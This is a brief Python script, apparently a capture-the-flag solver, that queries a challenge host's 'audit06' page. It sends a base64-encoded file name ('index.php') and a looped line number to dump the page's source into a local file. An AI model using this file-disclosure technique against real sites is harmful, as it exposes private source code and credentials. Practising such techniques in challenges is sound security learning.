#*-* encode:utf-8 *-*
import requests
import re

for i in range(1,100):
	url = "http://8e023c5a6336fedd.synctf.com:8002/audit/audit06/index.php?hs={0}&wj=aW5kZXgucGhw".format(i)
	req = requests.get(url)
	contents = str(req.text.encode('utf-8')).replace('\\r','').replace('\\n','')
	print(contents)
	pattern = r"<[^?].*?>'|\\x[a-z0-9]{2}|b'"
	contents = re.sub(pattern, "", contents)
	with open("1.txt", "a") as f:
		f.write(contents)
